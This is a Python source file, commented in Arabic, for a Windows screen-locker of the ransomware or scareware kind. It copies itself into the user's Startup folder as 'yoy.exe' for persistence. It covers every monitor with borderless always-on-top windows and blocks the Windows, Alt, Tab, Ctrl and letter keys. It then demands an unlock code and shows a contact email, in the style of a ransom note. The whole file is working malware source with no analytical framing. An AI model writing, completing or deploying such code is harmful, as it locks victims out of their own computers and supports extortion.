import tkinter as tk
from tkinter import messagebox
import winsound
import os
import sys
import shutil
import keyboard
import threading
from PIL import Image, ImageTk
from screeninfo import get_monitors

# تحديد المسارات
path_app = os.path.abspath(sys.argv[0])
run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
name = os.path.join(run_start, "yoy.exe")
image_path = os.path.join(os.path.dirname(path_app), "w.png")

# نسخ التطبيق إلى Startup إذا لم يكن موجودًا
if not os.path.exists(name):
    shutil.copy(path_app, name)

# نسخ صورة w.png إلى Startup إذا لم تكن موجودة
startup_image_path = os.path.join(run_start, "w.png")
if not os.path.exists(startup_image_path) and os.path.exists(image_path):
    shutil.copy(image_path, startup_image_path)

def exit_app():
    # تدمير الجذر (لكننا سنمنع هذا من الحدوث)
    root.destroy()

def clos(event=None):
    key = "1"
    if entry.get() == key:
        exit_app()
    else:
        winsound.Beep(1000, 500)
        messagebox.showerror("خطأ", "تواصل معي الإيميل بالأسفل")

def disable_f4(event=None):
    return "break"  # منع تنفيذ F4

def disable_win_key():
    keyboard.block_key("windows")  # تعطيل زر الويندوز

def disable_alt_tab():
    # تعطيل مفتاح Alt + Tab
    keyboard.block_key("alt")
    keyboard.block_key("tab")

def disable_ctrl():
    keyboard.block_key("ctrl")  # تعطيل مفتاح Ctrl

def disable_alt():
    keyboard.block_key("alt")  # تعطيل مفتاح Alt

def disable_other_keys():
    # تعطيل جميع المفاتيح باستثناء الأرقام وأيضًا لا نريد تعطيل backspace و delete
    keys_to_block = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", 
        "w", "x", "y", "z", "shift", "caps lock", "escape", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", 
        "f11", "f12", "space", "left", "right", "up", "down", "home", "end", "page up", 
        "page down", "pause", "print screen", "num lock", "scroll lock", "win", "alt", "ctrl", 
        "tab", "insert"  # شملت فقط المفاتيح التي لا تُعتبر ضرورية في هذه الحالة
    ]
    
    for key in keys_to_block:
        keyboard.block_key(key)  # تعطيل المفاتيح التي ليست أرقام أو التي لا تحتاجها

def create_red_window_on_non_main_monitors():
    """وظيفة لفتح نافذة حمراء على الشاشات غير الأساسية"""
    monitors = get_monitors()
    main_monitor = monitors[0]  # الشاشة الرئيسية هي أول شاشة في القائمة

    for monitor in monitors[1:]:  # تجاهل الشاشة الرئيسية وفتح النوافذ على الشاشات الأخرى
        root = tk.Tk()
        root.title("نافذة غير أساسية")
        root.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")  # تحديد موقع وحجم النافذة على الشاشة الثانوية
        root.overrideredirect(True)
        root.attributes("-topmost", True)
        root.config(background="black")

        # منع التفاعل مع النافذة (منع الإغلاق والتفاعل مع المفاتيح)
        root.bind("<F4>", disable_f4)
        root.bind("<Button-1>", lambda event: None)  # منع النقر على النافذة
        root.bind("<Button-3>", lambda event: None)  # منع النقر بالزر الأيمن
        root.bind("<Escape>", lambda event: None)  # منع استخدام مفتاح Esc

        # تعطيل بعض المفاتيح
        disable_f4(None)
        disable_win_key()
        disable_alt_tab()
        disable_ctrl()
        disable_alt()

        root.resizable(False, False)
        root.mainloop()

def create_login_window():
    """وظيفة لفتح نافذة الدخول على الشاشة الرئيسية فقط"""
    global root, entry

    # تحديد الشاشة الرئيسية
    monitors = get_monitors()
    main_monitor = monitors[0]  # الشاشة الرئيسية عادة تكون الشاشة الأولى في القائمة

    root = tk.Tk()
    root.title("نظام الدخول")
    root.geometry(f"{main_monitor.width}x{main_monitor.height}+{main_monitor.x}+{main_monitor.y}")  # تحديد مكان وحجم النافذة
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.config(background="black")  # تغيير اللون إلى black

    tk.Label(root, text=" لا تحاول العبث في نظام حمايتي ", bg="black", fg="red").pack()

    entry = tk.Entry(root, width=50, bd=0)
    entry.pack(pady=20)

    b = tk.Button(root, text=" تخطي التشفير ", command=clos)
    b.pack()

    root.bind("<F4>", disable_f4)

    image_path = os.path.join(os.path.dirname(path_app), "w.png")  
    if os.path.exists(image_path):
        img = Image.open(image_path)
        photo = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=photo, borderwidth=0, highlightthickness=0)
        label.photo = photo  # حفظ المرجع للصورة لتجنب التخلص منها
        label.pack()
    else:
        tk.Label(root, text="الصورة غير موجودة", bg="black", fg="red").pack()

    tk.Label(root, text="CodeX343434@outlook.com", bg="black", fg="red").place(
        x=(root.winfo_screenwidth() // 2) - 50, y=600)

    # تفعيل تعطيل مفتاح الويندوز و Alt + Tab عند بدء التطبيق
    disable_win_key()
    disable_alt_tab()

    # تعطيل Ctrl و Alt في جميع الشاشات
    disable_ctrl()
    disable_alt()

    # تعطيل جميع المفاتيح باستثناء الأرقام
    disable_other_keys()

    root.resizable(False, False)

    # فتح نافذة حمراء على الشاشات غير الأساسية في نفس الوقت
    threading.Thread(target=create_red_window_on_non_main_monitors, daemon=True).start()

    root.mainloop()

# فتح نافذة الدخول على الشاشة الرئيسية مع الشاشات الثانوية
create_login_window()
